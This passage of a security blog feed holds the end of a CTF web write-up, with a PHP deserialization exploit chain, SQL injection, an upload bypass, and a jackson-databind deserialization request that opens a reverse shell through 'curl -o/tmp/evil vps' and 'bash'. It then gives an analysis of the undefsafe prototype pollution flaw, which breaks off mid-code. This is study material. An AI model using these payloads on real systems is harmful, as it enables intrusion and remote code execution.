class="line">Loader/Configurator/ImportConfigurator.php</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-06-25-09-08-48.png" alt=""><br>其中<strong>destruct方法中，parent属性调用了addCollection方法，同时parent可控，那么此时如果找到一个拥有</strong>call函数的类，并将parent赋值为其对象，即可触发<strong>call，于是我们全局搜索</strong>call方法：<br>发现在如下路径中，存在Generator类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/Faker/Generator.php</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-06-25-09-10-27.png" alt=""><br>其具有__call方法，我们再跟进format方法：<br><img src="/images/2020-06-25-09-10-46.png" alt=""><br>发现存在敏感调用点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array</span><br></pre></td></tr></table></figure></p><p>至此我们可以想到构造链为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ImportConfigurator  __destruct</span><br><span class="line">-&gt;</span><br><span class="line">Generator   __call</span><br><span class="line">-&gt;</span><br><span class="line">Generator  format</span><br><span class="line">-&gt;</span><br><span class="line">call_user_func_array</span><br></pre></td></tr></table></figure></p><p>但在简单构造后，我们本地测试，可以发现如下报错：<br><img src="/images/2020-06-24-14-43-28.png" alt=""><br>查看Generator类相应源码：<br><img src="/images/2020-06-24-14-43-39.png" alt=""><br>发现我们可以利用数组进行bypass:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters = <span class="keyword">array</span>(<span class="string">'addCollection'</span>=&gt;<span class="string">'system'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么可以容易构造出如下exp：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line">        protected $formatters = array('addCollection'=&gt;'system');</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent, $route)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = $route;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RCE</span></span><br><span class="line">&#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> \<span class="title">Faker</span>\<span class="title">Generator</span>();</span><br><span class="line">    $b = <span class="keyword">new</span> \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($a,<span class="string">'RCE CMD'</span>);</span><br><span class="line">    $exp = serialize($b);</span><br><span class="line">    <span class="keyword">echo</span> urlencode($exp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先列目录：<br><img src="/images/2020-06-24-14-50-55.png" alt=""><br>再读根目录：<br><img src="/images/2020-06-24-14-50-42.png" alt=""><br>发现flag文件，并读取：<br><img src="/images/2020-06-24-14-50-22.png" alt=""></p><h2 id="美团外卖"><a href="#美团外卖" class="headerlink" title="美团外卖"></a>美团外卖</h2><p>首先进行目录扫描，发现www.zip文件泄露，随即进行代码审计，发现daochu.php功能非常可疑，同时不需要登录，并且存在sql注入点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($type==<span class="number">1</span>)&#123;</span><br><span class="line">$biao=<span class="string">'content'</span>;</span><br><span class="line">$result = mysqli_query($link,<span class="string">'select * from '</span>.$biao.<span class="string">' where imei="'</span>.$imei.<span class="string">'" and  imei2="'</span>.$imei2.<span class="string">'"'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;table border="1"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;tr&gt;&lt;th&gt;user&lt;/th&gt;&lt;th&gt;code&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;phonenumber&lt;/th&gt;&lt;/tr&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_assoc($result))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">'imei'</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">'imei2'</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">'tel'</span>].<span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/table&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此时我们发现$type,$imei,$imei2均为可控点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'common/Db.php'</span>);</span><br><span class="line">header(<span class="string">"Content-Type: application/xls"</span>);   </span><br><span class="line">$type=$_GET[<span class="string">'type'</span>];</span><br><span class="line"><span class="keyword">if</span>($type==<span class="number">1</span>)&#123;$a=<span class="string">'通讯录'</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>($type==<span class="number">2</span>)&#123;$a=<span class="string">'短信'</span>;&#125;</span><br><span class="line">header(<span class="string">"Content-Disposition: attachment; filename="</span>.$_GET[<span class="string">'imei'</span>].<span class="string">"-"</span>.$a.<span class="string">".xls"</span>);  </span><br><span class="line">header(<span class="string">"Pragma: no-cache"</span>); </span><br><span class="line">header(<span class="string">"Expires: 0"</span>);</span><br><span class="line">$imei=$_GET[<span class="string">'imei'</span>];</span><br><span class="line">$imei2=$_GET[<span class="string">'imei2'</span>];</span><br></pre></td></tr></table></figure></p><p>同时sql查询无过滤，于是尝试读取信息，发现数据库中存在hint表：<br><img src="/images/2020-06-24-16-08-56.png" alt=""><br>在其中得知一个目录信息，在该目录下，我们发现源码中存在的组件lib/webuploader/0.1.5/server/preview.php，可以使用，而在最初的目录是不可用的。<br>同时该组件存在一些上传漏洞，参考链接如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://9finger.cn/2020/03/06/CNVD-2018-26054%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</span><br></pre></td></tr></table></figure></p><p>但是由于过滤了php，于是我们选择使用phtml进行bypass：<br><img src="/images/2020-06-24-16-18-29.png" alt=""><br>题目又给了下一个文件，我们访问后，提示我们需要传入file参数，于是测试：<br><img src="/images/2020-06-24-16-19-30.png" alt=""><br>发现可以读取/etc/passwd，那么尝试读取flag文件：<br><img src="/images/2020-06-24-16-19-49.png" alt=""></p><h2 id="zzm’s-blog"><a href="#zzm’s-blog" class="headerlink" title="zzm’s blog"></a>zzm’s blog</h2><p>题目给予了pom.xml的文件，我们查看发现:<br><img src="/images/2020-06-25-09-22-43.png" alt=""><br>题目使用了jackson-databind 2.9.8，但是其存在CVE-2019-12086的隐患。于是可以参考链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paper.seebug.org/1227/#71-fnmsd</span><br></pre></td></tr></table></figure></p><p>发现有现成工具可用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fnmsd/MySQL_Fake_Server</span><br></pre></td></tr></table></figure></p><p>其可以帮助我们进行反序列化攻击，于是将其部署，同时发现题目存在commons-collections：<br><img src="/images/2020-06-25-09-24-49.png" alt=""><br>于是我们使用ysoserial的CommonsCollections chain进行测试，这里我选择了CommonsCollections5:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?query=&#123;&quot;id&quot;%3a[&quot;com.mysql.cj.jdbc.admin.MiniAdmin&quot;,+&quot;jdbc%3amysql%3a//vps_ip%3a23334/test%3fautoDeserialize%3dtrue%26queryInterceptors%3dcom.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor%26user%3dyso_CommonsCollections5_bash+-c+&#123;echo,base64_cmd&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]&#125;</span><br></pre></td></tr></table></figure></p><p>发现可以成功打通，于是执行如下命令，尝试反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -o/tmp/evil vps</span><br><span class="line">/bin/bash /tmp/evil</span><br></pre></td></tr></table></figure></p><p>让目标服务器来访问恶意文件并保存至/tmp目录下，再执行进行shell反弹：<br><img src="/images/2020-06-24-17-42-47.png" alt=""><br>然后可以轻松获取flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;90d88050-42fc-4dc6-9b10-b40b82e44495&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>总的来说，比赛比去年举办的有些意思了，至少没有一直发生宕机，或者出题人自己都不懂题目原理的情况，像laravel的chain的寻找和zzm’s blog的cve复现，感觉都还行~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;近日参加了第五空间的比赛，以下是比赛中Web的所有题解。&lt;/p&gt;
&lt;h2 id=&quot;hate-php&quot;&gt;&lt;a href=&quot;#hate-php&quot;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-10795 &amp; undefsafe Prototype Pollution Vulnerability</title>
    <link href="http://skysec.top/2020/06/22/CVE-2019-10795-undefsafe-Prototype-Pollution-Vulnerability/"/>
    <id>http://skysec.top/2020/06/22/CVE-2019-10795-undefsafe-Prototype-Pollution-Vulnerability/</id>
    <published>2020-06-22T09:56:05.000Z</published>
    <updated>2020-06-22T11:51:46.076Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>undefsafe是Nodejs的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在的报错问题，其具有巨大的用户量：<br><img src="/images/2020-06-22-17-58-24.png" alt=""><br>但其在低版本存在原型链污染漏洞。<br>漏洞版本：&lt; 2.0.3</p><h2 id="模块使用"><a href="#模块使用" class="headerlink" title="模块使用"></a>模块使用</h2><p>我们简单测试一下该模块的使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var object = &#123;</span><br><span class="line">    a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">            c: 1,</span><br><span class="line">            d: [1,2,3],</span><br><span class="line">            e: &apos;skysec&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">console.log(object.a.b.e)</span><br><span class="line">// skysec</span><br></pre></td></tr></table></figure></p><p>可以看到当我们正常访问object属性的时候会有正常的回显，但当我们访问不存在属性时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(object.a.c.e)</span><br><span class="line">// TypeError: Cannot read property &apos;e&apos; of undefined</span><br></pre></td></tr></table></figure></p><p>则会得到报错。<br>在编程时，代码量较大时，我们可能经常会遇到类似情况，导致程序无法正常运行，发送我们最讨厌的报错（ ，那么undefsafe可以帮助我们解决这个问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">console.log(a(object,&apos;a.b.e&apos;))</span><br><span class="line">// skysec</span><br><span class="line"></span><br><span class="line">console.log(object.a.b.e)</span><br><span class="line">// skysec</span><br><span class="line"></span><br><span class="line">console.log(a(object,&apos;a.c.e&apos;))</span><br><span class="line">// undefined</span><br><span class="line"></span><br><span class="line">console.log(object.a.c.e)</span><br><span class="line">// TypeError: Cannot read property &apos;e&apos; of undefined</span><br></pre></td></tr></table></figure></p><p>那么当我们无意间访问到对象不存在的属性时，就不会再进行报错，而是会返回undefined了。<br>同时在对对象赋值时，如果目标属性存在：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">    a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">            c: 1,</span><br><span class="line">            d: [1,2,3],</span><br><span class="line">            e: &apos;skysec&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">console.log(object)</span><br><span class="line">// &#123; a: &#123; b: &#123; c: 1, d: [Array], e: &apos;skysec&apos; &#125; &#125; &#125;</span><br><span class="line">a(object,&apos;a.b.e&apos;,&apos;123&apos;)</span><br><span class="line">console.log(object)</span><br><span class="line">// &#123; a: &#123; b: &#123; c: 1, d: [Array], e: &apos;123&apos; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到，其可以帮助我们修改对应属性的值。<br>如果当属性不存在时，我们想对该属性赋值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">    a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">            c: 1,</span><br><span class="line">            d: [1,2,3],</span><br><span class="line">            e: &apos;skysec&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">console.log(object)</span><br><span class="line">// &#123; a: &#123; b: &#123; c: 1, d: [Array], e: &apos;skysec&apos; &#125; &#125; &#125;</span><br><span class="line">a(object,&apos;a.f.e&apos;,&apos;123&apos;)</span><br><span class="line">console.log(object)</span><br><span class="line">// &#123; a: &#123; b: &#123; c: 1, d: [Array], e: &apos;skysec&apos; &#125;, e: &apos;123&apos; &#125; &#125;</span><br></pre></td></tr></table></figure></p><p>访问属性会在上层进行创建并赋值。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>但是该模块在小于2.0.3版本，存在原型链污染漏洞：<br>我们在2.0.3版本下进行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">    a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">            c: 1,</span><br><span class="line">            d: [1,2,3],</span><br><span class="line">            e: &apos;skysec&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var payload = &quot;__proto__.toString&quot;;</span><br><span class="line">a(object,payload,&quot;evilstring&quot;);</span><br><span class="line">console.log(object.toString);</span><br><span class="line">// [Function: toString]</span><br></pre></td></tr></table></figure></p><p>但如果在低于2.0.3版本运行，则会得到如下输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">    a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">            c: 1,</span><br><span class="line">            d: [1,2,3],</span><br><span class="line">            e: &apos;skysec&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var payload = &quot;__proto__.toString&quot;;</span><br><span class="line">a(object,payload,&quot;evilstring&quot;);</span><br><span class="line">console.log(object.toString);</span><br><span class="line">//evilstring</span><br></pre></td></tr></table></figure></p><p>我们发现当undefsafe第2，3个参数可控时，我们可以污染object的值（即第一个参数）。<br>那么这种攻击有什么用呢？我们简单看一个例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var test = &#123;&#125;</span><br><span class="line"></span><br><span class="line">console.log(&apos;this is &apos;+test)</span><br><span class="line">// this is [object Object]</span><br><span class="line">a(test,&apos;__proto__.toString&apos;,function()&#123; return &apos;just a evil!&apos;&#125;)</span><br><span class="line">console.log(&apos;this is &apos;+test)</span><br><span class="line">// this is just a evil!</span><br></pre></td></tr></table></figure></p><p>当我们将对象与字符串拼接时，会自动触发toString方法，但由于当前对象test中没有该方法，因此不断向上回溯。当前环境中等同于在<code>test.__proto__</code>中寻找toString方法：<br><img src="/images/2020-06-22-18-49-34.png" alt=""><br>然后将返回：<code>[object Object]</code>，并与this is进行拼接。<br>但是当我们使用undefsafe的时候，可以对原型进行污染，污染前，原型中toString方法为：<br><img src="/images/2020-06-22-18-53-25.png" alt=""><br>污染后：<br><img src="/images/2020-06-22-18-52-48.png" alt=""><br>此时我们进行测试：<br><img src="/images/2020-06-22-18-53-52.png" alt=""><br>我们发现一个空对象和字符串123进行拼接，竟然返回了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">just a evil!123</span><br></pre></td></tr></table></figure></p><p>那么这就是因为原型链污染导致，当我们调用b对象和字符串拼接时，触发其toString方法，但由于当前对象中没有，则回溯至原型中寻找，并发现toString方法，同时进行调用，而此时原型中的toString方法已被我们污染，因此可以导致其输出被我们污染后的结果。<br>例如操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line"></span><br><span class="line">var test = &#123;&#125;</span><br><span class="line"></span><br><span class="line">var payload = &quot;__proto__.toString&quot;;</span><br><span class="line">a(test,payload,&quot;evilstring&quot;);</span><br></pre></td></tr></table></figure></p><p>我们跟进undefsafe函数内，第一次赋值在如下时候：<br><img src="/images/2020-06-22-19-04-36.png" alt=""><br>此时我们传入的test，会变成<code>test.__proto__</code>:<br><img src="/images/2020-06-22-19-04-54.png" alt=""><br>而后会进行递归，至第二次：<br><img src="/images/2020-06-22-19-06-26.png" alt=""><br>此时传入的test的就会变为<code>test.__proto__.toString</code>:<br><img src="/images/2020-06-22-19-07-03.png" alt=""><br>然后进行赋值：<br><img src="/images/2020-06-22-19-07-37.png" alt=""><br>从而达到原型链污染的目的。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>该漏洞在2.0.3版本进行修复，我们看到patch内容如下：<br><img src="/images/2020-06-22-19-13-27.png" alt=""><br>在赋值前增加校验：<br><img src="/images/2020-06-22-19-13-17.png" alt=""><br>发现如果操纵原型，则会返还undefined。</p><h2 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h2><p>在2020网鼎杯中有一道题正好考察到了这一点：notes.<br>源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line">var path = require(&apos;path&apos;);</span><br><span class="line">const undefsafe = require(&apos;undefsafe&apos;);</span><br><span class="line">const &#123; exec &#125; = require(&apos;child_process&apos;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line">class Notes &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.owner = &quot;whoknows&quot;;</span><br><span class="line">        this.num = 0;</span><br><span class="line">        this.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        var r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(this.note_list, id));</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(this.note_list, id + &apos;.author&apos;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &apos;.raw_note&apos;, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        return this.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        delete this.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var notes = new Notes();</span><br><span class="line">notes.write_note(&quot;nobody&quot;, &quot;this is nobody&apos;s first note&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(&apos;views&apos;, path.join(__dirname, &apos;views&apos;));</span><br><span class="line">app.set(&apos;view engine&apos;, &apos;pug&apos;);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, &apos;public&apos;)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(&apos;/&apos;, function(req, res, next) &#123;</span><br><span class="line">    res.render(&apos;index&apos;, &#123; title: &apos;Notebook&apos; &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(&apos;/add_note&apos;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&apos;mess&apos;, &#123;message: &apos;please use POST to add a note&apos;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let author = 